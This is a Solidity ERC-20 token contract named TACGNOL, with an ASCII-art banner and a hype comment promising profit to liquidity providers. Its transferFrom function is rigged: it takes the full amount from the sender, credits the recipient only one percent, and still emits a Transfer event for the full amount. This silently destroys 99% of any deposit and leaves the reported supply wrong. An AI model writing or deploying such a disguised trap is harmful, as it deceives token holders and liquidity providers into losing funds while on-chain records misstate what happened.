pragma solidity ^0.5.0;

/***https://meme-poggers.com***/

//      TTTTTTTTTTTTTTTTTTTTTTT         AAA                  CCCCCCCCCCCCC       GGGGGGGGGGGGGNNNNNNNN        NNNNNNNN     OOOOOOOOO     LLLLLLLLLLL             
//      T:::::::::::::::::::::T        A:::A              CCC::::::::::::C    GGG::::::::::::GN:::::::N       N::::::N   OO:::::::::OO   L:::::::::L             
//      T:::::::::::::::::::::T       A:::::A           CC:::::::::::::::C  GG:::::::::::::::GN::::::::N      N::::::N OO:::::::::::::OO L:::::::::L             
//      T:::::TT:::::::TT:::::T      A:::::::A         C:::::CCCCCCCC::::C G:::::GGGGGGGG::::GN:::::::::N     N::::::NO:::::::OOO:::::::OLL:::::::LL             
//      TTTTTT  T:::::T  TTTTTT     A:::::::::A       C:::::C       CCCCCCG:::::G       GGGGGGN::::::::::N    N::::::NO::::::O   O::::::O  L:::::L               
//              T:::::T            A:::::A:::::A     C:::::C             G:::::G              N:::::::::::N   N::::::NO:::::O     O:::::O  L:::::L               
//              T:::::T           A:::::A A:::::A    C:::::C             G:::::G              N:::::::N::::N  N::::::NO:::::O     O:::::O  L:::::L               
//              T:::::T          A:::::A   A:::::A   C:::::C             G:::::G    GGGGGGGGGGN::::::N N::::N N::::::NO:::::O     O:::::O  L:::::L               
//              T:::::T         A:::::A     A:::::A  C:::::C             G:::::G    G::::::::GN::::::N  N::::N:::::::NO:::::O     O:::::O  L:::::L               
//              T:::::T        A:::::AAAAAAAAA:::::A C:::::C             G:::::G    GGGGG::::GN::::::N   N:::::::::::NO:::::O     O:::::O  L:::::L               
//              T:::::T       A:::::::::::::::::::::AC:::::C             G:::::G        G::::GN::::::N    N::::::::::NO:::::O     O:::::O  L:::::L               
//              T:::::T      A:::::AAAAAAAAAAAAA:::::AC:::::C       CCCCCCG:::::G       G::::GN::::::N     N:::::::::NO::::::O   O::::::O  L:::::L         LLLLLL
//            TT:::::::TT   A:::::A             A:::::AC:::::CCCCCCCC::::C G:::::GGGGGGGG::::GN::::::N      N::::::::NO:::::::OOO:::::::OLL:::::::LLLLLLLLL:::::L
//            T:::::::::T  A:::::A               A:::::ACC:::::::::::::::C  GG:::::::::::::::GN::::::N       N:::::::N OO:::::::::::::OO L::::::::::::::::::::::L
//            T:::::::::T A:::::A                 A:::::A CCC::::::::::::C    GGG::::::GGG:::GN::::::N        N::::::N   OO:::::::::OO   L::::::::::::::::::::::L
//            TTTTTTTTTTTAAAAAAA                   AAAAAAA   CCCCCCCCCCCCC       GGGGGG   GGGGNNNNNNNN         NNNNNNN     OOOOOOOOO     LLLLLLLLLLLLLLLLLLLLLLLL

/***HIGHLY EXPERIMENTAL MEME TOKEN. 100% PROFIT FOR LIQUIDITY PROVIDERS AT A PENALTY OF 100:1 BURN ON PROVISION. NOVELTY COLLECTORS ITEM.***/

// ----------------------------------------------------------------------------
// ERC-20 Interface
// ----------------------------------------------------------------------------

interface ERC20Interface {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library 
// ----------------------------------------------------------------------------

contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {c = a + b; require(c >= a); }
    function safeSub(uint a, uint b) public pure returns (uint c) { require(b <= a); c = a - b; }
    function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); }
    function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0); c = a / b; }
}

// ----------------------------------------------------------------------------
// ERC-20 Token Contract
// ----------------------------------------------------------------------------

contract TACGNOL is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;
    
    uint256 public _totalSupply;
    
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    
    constructor() public {
        name = "TACGNOL";
        symbol = "TACG";
        decimals = 18;
        _totalSupply = 10000000000000000000000000;
        
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
    function totalSupply() public view returns (uint) {
        return _totalSupply - balances[address(0)];
    }
    
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
    
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }
    
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens / 100);
        emit Transfer(from, to, tokens);
        return true;
    }
}